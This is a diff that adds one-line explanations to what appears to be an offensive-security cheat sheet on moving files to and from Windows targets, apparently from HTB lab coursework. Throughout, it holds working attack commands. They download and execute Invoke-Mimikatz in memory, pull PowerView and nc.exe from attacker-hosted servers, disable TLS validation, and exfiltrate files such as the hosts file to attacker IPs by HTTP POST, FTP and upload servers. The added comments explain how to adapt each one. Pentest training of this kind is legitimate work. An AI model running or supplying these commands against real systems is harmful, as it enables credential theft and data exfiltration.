@@ -42,6 +42,7 @@ Step 7: Userinit process hollowing → reflective DLL loading → Astaroth info-
 ```bash
 md5sum id_rsa
 ```
+> Generates the MD5 hash of the file on your attack machine. Save this value to verify the file arrives intact on the target.
 
 ```
 4e301756a07ded0a2dd6953abf015278  id_rsa
@@ -52,6 +53,7 @@ md5sum id_rsa
 ```bash
 cat id_rsa | base64 -w 0; echo
 ```
+> Encodes the file as a base64 string without line wrapping (`-w 0`). The trailing `echo` adds a newline so the terminal prompt appears on a new line. Copy the entire output and paste it into the PowerShell command on the Windows target.
 
 ```
 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
@@ -64,12 +66,14 @@ LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...
 ```powershell
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K..."))
 ```
+> Decodes the base64 string and writes the raw bytes directly to a file on the Windows target. Replace the base64 string with the actual output from the previous step. No network connection needed — the data was pasted into the terminal.
 
 ### Step 4: Confirm MD5 Hashes Match (Windows)
 
 ```powershell
 Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 ```
+> Computes the MD5 hash on the Windows target to verify the decoded file matches the source; swap the file path.
 
 ```
 Algorithm       Hash                                    Path
@@ -119,6 +123,7 @@ Downloads a file **to disk** on the target:
 # Asynchronous (non-blocking)
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
 ```
+> Downloads a file to disk on the Windows target via WebClient (works in all PowerShell versions); swap the URL and destination path.
 
 ---
 
@@ -130,6 +135,7 @@ Downloads a file **to disk** on the target:
 # Direct execution
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
 ```
+> Downloads a script into memory and executes it with no disk write (fileless); swap the URL for the script you want to run.
 
 ```powershell
 # Pipeline input to IEX
@@ -147,6 +153,7 @@ Available from PowerShell 3.0 onwards. **Noticeably slower** than WebClient but 
 ```powershell
 Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
 ```
+> Downloads a file to disk using the simpler Invoke-WebRequest cmdlet (PowerShell 3.0+); swap the URL and the -OutFile name.
 
 **Aliases:** `iwr`, `curl`, `wget` (these are PowerShell aliases, NOT the Linux tools)
 
@@ -182,6 +189,7 @@ Specify the UseBasicParsing parameter and try again.
 ```powershell
 Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
 ```
+> Same download piped to IEX with -UseBasicParsing to avoid the IE-engine error; swap the IP/URL.
 
 ### Error 2: SSL/TLS Certificate Not Trusted
 
@@ -195,6 +203,7 @@ closed: Could not establish trust relationship for the SSL/TLS secure channel."
 ```powershell
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 ```
+> Disables SSL/TLS certificate validation in the current PowerShell session so self-signed servers work; run before the download, no values to change.
 
 ---
 
@@ -207,12 +216,14 @@ closed: Could not establish trust relationship for the SSL/TLS secure channel."
 ```bash
 sudo impacket-smbserver share -smb2support /tmp/smbshare
 ```
+> Spins up an SMB share named `share` serving a local directory so the Windows target can copy from it; change the share name and served path.
 
 ### Download File (Windows Target)
 
 ```cmd
 C:\htb> copy \\192.168.220.133\share\nc.exe
 ```
+> Copies a file from the attacker's SMB share to the current directory on the target; swap the attacker IP, share name, and filename.
 
 ### ⚠️ Unauthenticated Guest Access Blocked
 
@@ -229,12 +240,14 @@ block unauthenticated guest access.
 # Attack machine — create authenticated SMB server
 sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 ```
+> Same SMB server but with credentials, required because newer Windows blocks guest access; change the username and password (and served path).
 
 ```cmd
 :: Windows target — mount with credentials then copy
 C:\htb> net use n: \\192.168.220.133\share /user:test test
 C:\htb> copy n:\nc.exe
 ```
+> Maps the authenticated SMB share to drive N: then copies a file from it; swap the attacker IP, share, credentials, and filename.
 
 ---
 
@@ -252,12 +265,14 @@ sudo pip3 install pyftpdlib
 # Anonymous authentication enabled by default
 sudo python3 -m pyftpdlib --port 21
 ```
+> Starts an anonymous read-only FTP server on port 21 on the attack machine; change the port if 21 is in use.
 
 ### Download via PowerShell
 
 ```powershell
 (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
 ```
+> Downloads a file over FTP using PowerShell WebClient; swap the FTP URL/IP, remote filename, and destination path.
 
 ### Download via FTP Command File (Non-Interactive Shell)
 
@@ -287,6 +302,7 @@ C:\htb> ftp -v -n -s:ftpcommand.txt
 ```powershell
 [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 ```
+> Reads a file on the Windows target and prints it as a base64 string to copy back to your attack machine; swap the file path.
 
 ```
 IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCi...
@@ -297,6 +313,7 @@ IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCi...
 ```powershell
 Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
 ```
+> Gets the MD5 hash of the source file on Windows so you can verify the upload after decoding; swap the file path.
 
 ```
 Hash
@@ -310,6 +327,7 @@ Hash
 echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCi... | base64 -d > hosts
 md5sum hosts
 ```
+> Decodes the pasted base64 back into a file on your attack machine and hashes it to confirm it matches; replace the base64 string and output filename.
 
 ```
 3688374325b992def12793500307566d  hosts
@@ -329,6 +347,7 @@ PowerShell has **no built-in upload function**, but we can use `Invoke-WebReques
 pip3 install uploadserver
 python3 -m uploadserver
 ```
+> Installs and starts the Python upload server (default port 8000) to receive files exfiltrated from Windows; pass a port to change it.
 
 ```
 File upload available at /upload
@@ -344,6 +363,7 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 # Upload the file
 Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
 ```
+> Loads PSUpload.ps1 filelessly then uploads a file from the Windows target to your upload server; swap the Uri/IP and the -File path.
 
 ```
 [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
@@ -357,6 +377,7 @@ Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System
 $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
 Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
 ```
+> Base64-encodes a file and POSTs it to a Netcat listener for exfiltration; swap the file path and the listener URL/IP.
 
 ```bash
 # Attack machine: Catch with Netcat and decode
@@ -364,6 +385,7 @@ nc -lvnp 8000
 # Copy the base64 body from the POST request, then:
 echo <base64> | base64 -d -w 0 > hosts
 ```
+> Listens for the POSTed base64 then decodes it back into the file; change the port and replace `<base64>` with the captured body / output filename.
 
 ---
 
@@ -384,6 +406,7 @@ sudo pip3 install wsgidav cheroot
 # Start WebDAV server
 sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
 ```
+> Runs an anonymous WebDAV server (SMB-over-HTTP) so Windows can reach it when port 445 is blocked outbound; change the port and --root directory.
 
 #### Browse the WebDAV Share (Windows Target)
 
@@ -413,12 +436,14 @@ Same as FTP downloads, but start the server with `--write` to allow uploads.
 ```bash
 sudo python3 -m pyftpdlib --port 21 --write
 ```
+> Starts an FTP server with write enabled so the target can upload files to you; change the port if 21 is busy.
 
 #### Upload via PowerShell
 
 ```powershell
 (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
+> Uploads a file from the Windows target to the FTP server via WebClient; swap the FTP URL/IP, remote name, and local file path.
 
 #### Upload via FTP Command File (Non-Interactive Shell)
 
@@ -430,6 +455,7 @@ C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
 C:\htb> echo bye >> ftpcommand.txt
 C:\htb> ftp -v -n -s:ftpcommand.txt
 ```
+> Builds a scripted FTP command file then runs it to PUT/upload a file from a non-interactive shell; swap the server IP and the local file path.
 
 ---
 
@@ -517,11 +543,13 @@ You have RDP creds and need to upload a tool/payload (e.g., `payload.zip`) to th
 cd /path/to/payload/
 python3 -m http.server 8080
 ```
+> Serves the payload folder over HTTP on port 8080; swap the directory path and change 8080 if it's in use.
 
 **RDP into target, open PowerShell:**
 ```bash
 xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /dynamic-resolution /compression /bpp:8 /network:modem -wallpaper -themes -aero
 ```
+> Opens an RDP session to the Windows target with low-bandwidth tuning; replace the target IP, username, and password.
 
 **On Windows target (PowerShell):**
 ```powershell
@@ -550,6 +578,7 @@ sudo impacket-smbserver share -smb2support /path/to/payload/
 # With auth (if guest access blocked)
 sudo impacket-smbserver share -smb2support /path/to/payload/ -user test -password test
 ```
+> Starts an SMB share (anonymous or authenticated) serving the payload folder; swap the served path and, for auth, the username/password.
 
 **On Windows target (cmd or PowerShell):**
 ```cmd
@@ -572,6 +601,7 @@ copy n:\payload.zip C:\Users\Public\payload.zip
 sudo pip3 install pyftpdlib
 sudo python3 -m pyftpdlib --port 21
 ```
+> Installs and starts an anonymous FTP server on port 21 in the payload directory; change the port if 21 is busy.
 
 **On Windows target (PowerShell):**
 ```powershell
@@ -589,6 +619,7 @@ sudo python3 -m pyftpdlib --port 21
 cat payload.zip | base64 -w 0; echo
 # Copy the entire output
 ```
+> Encodes the payload as a single base64 string to paste into the target when all network transfers are blocked; swap the filename.
 
 **On Windows target (PowerShell):**
 ```powershell
